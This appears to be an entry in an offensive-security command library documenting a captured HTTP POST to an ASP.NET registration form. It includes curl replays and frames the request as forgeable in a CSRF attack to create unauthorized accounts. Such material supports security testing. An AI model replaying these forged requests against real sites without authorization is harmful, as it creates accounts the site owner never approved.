---
data: >-
  POST /███████ HTTP/1.1

  Host: ████████

  Connection: close

  Content-Length: 9860

  Cache-Control: max-age=0

  Upgrade-Insecure-Requests: 1

  Origin: https://████

  Content-Type: application/x-www-form-urlencoded

  User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36
  (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36

  Accept:
  text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

  Sec-Fetch-Site: same-origin

  Sec-Fetch-Mode: navigate

  Sec-Fetch-User: ?1

  Sec-Fetch-Dest: document

  Referer: https://█████

  Accept-Encoding: gzip, deflate

  Accept-Language: en-US,en;q=0.9


  __LASTFOCUS=Last focus&__VIEWSTATE=ASP.NET view state&__EVENTTARGET=Event
  target&__EVENTARGUMENT=Event argument&__EVENTVALIDATION=Event
  validation&__VIEWSTATEGENERATOR=View state
  generator&ctl00$masterContentHolder$wizardCreateNewUser$_CustomNav0$StepNextButton=Create
  User&ctl00$masterContentHolder$wizardCreateNewUser$CreateUserStepContainer$Email=dsafhdsk@gmail.com&ctl00$masterContentHolder$wizardCreateNewUser$CreateUserStepContainer$Answer=Security
  answer&ctl00$masterContentHolder$wizardCreateNewUser$CreateUserStepContainer$Password=Asdfgh123456@&ctl00$masterContentHolder$wizardCreateNewUser$CreateUserStepContainer$Question=Security
  question&ctl00$masterContentHolder$wizardCreateNewUser$CreateUserStepContainer$UserName=username&ctl00$masterContentHolder$wizardCreateNewUser$CreateUserStepContainer$textboxCity=City&ctl00$masterContentHolder$wizardCreateNewUser$CreateUserStepContainer$textboxZipCode=Zip&ctl00$masterContentHolder$wizardCreateNewUser$CreateUserStepContainer$ConfirmPassword=Asdfgh123456@&ctl00$masterContentHolder$wizardCreateNewUser$CreateUserStepContainer$textboxAddress1=Address1&ctl00$masterContentHolder$wizardCreateNewUser$CreateUserStepContainer$textboxAddress2=Address2&ctl00$masterContentHolder$wizardCreateNewUser$CreateUserStepContainer$textboxJobTitle=Job&ctl00$masterContentHolder$wizardCreateNewUser$CreateUserStepContainer$textboxLastName=addfsag&ctl00$masterContentHolder$wizardCreateNewUser$CreateUserStepContainer$textboxCellPhone=Phone&ctl00$masterContentHolder$wizardCreateNewUser$CreateUserStepContainer$textboxFirstName=df&ctl00$masterContentHolder$wizardCreateNewUser$CreateUserStepContainer$dropDownListState=KS&ctl00$masterContentHolder$wizardCreateNewUser$CreateUserStepContainer$dropDownListSector=Federal&ctl00$masterContentHolder$wizardCreateNewUser$CreateUserStepContainer$textboxPhoneNumber=Phone&ctl00$masterContentHolder$wizardCreateNewUser$CreateUserStepContainer$textboxConfirmEmail=dsafhdsk@gmail.com&ctl00$masterContentHolder$wizardCreateNewUser$CreateUserStepContainer$textboxOrganizationName=Org&ctl00$masterContentHolder$wizardCreateNewUser$CreateUserStepContainer$checkBoxAcceptDisclaimer=on
tags:
  - csrf
  - post
  - registration
type: command
output: >-
  HTTP/1.1 200 OK

  Content-Type: text/html


  Your account has been created, but before you can login you must first verify
  your email address. A message has been sent to the email address you
  specified.
executor: http
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:36.131Z'
id: 0f79b905-16d5-4d6f-b7c2-54593f20d71f
verified: false
validated: true
submitted: true
---
# Submit-User-Registration-POST

## Command

```http
POST /███████ HTTP/1.1
Host: ████████
Content-Type: application/x-www-form-urlencoded

[full form data as above]
```

## Description

This HTTP POST command submits user registration data to an ASP.NET endpoint, including hidden fields and user inputs, which can be forged in a CSRF attack to create unauthorized accounts.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| __VIEWSTATE | ASP.NET state management token | Yes |
| ctl00$masterContentHolder$wizardCreateNewUser$CreateUserStepContainer$textboxFirstName | First name input | Yes |
| ctl00$masterContentHolder$wizardCreateNewUser$CreateUserStepContainer$Email | Email address | Yes |
| ctl00$masterContentHolder$wizardCreateNewUser$CreateUserStepContainer$Password | Password | Yes |
| ctl00$masterContentHolder$wizardCreateNewUser$_CustomNav0$StepNextButton | Submit button value | Yes |
| checkBoxAcceptDisclaimer | Disclaimer acceptance | Yes |

## Examples

### Basic Usage

Use curl to replicate:

```bash
curl -X POST https://target/███████ -H "Content-Type: application/x-www-form-urlencoded" -d "__VIEWSTATE=...&textboxFirstName=df&Email=dsafhdsk@gmail.com&..."
```

### Advanced Usage

Include full headers for realism:

```bash
curl -X POST https://target/███████ -H "User-Agent: Mozilla/5.0..." -H "Referer: https://target" -d "[full data]"
```

## Expected Output

Server responds with a success message indicating account creation and email verification sent, such as "Your account has been created... A message has been sent to the email address you specified."

## Related

- [[procedures/Intercept-and-Generate-CSRF-PoC-with-Burp-Suite]]
- [[procedures/Execute-CSRF-PoC-for-Unauthorized-Account-Creation]]
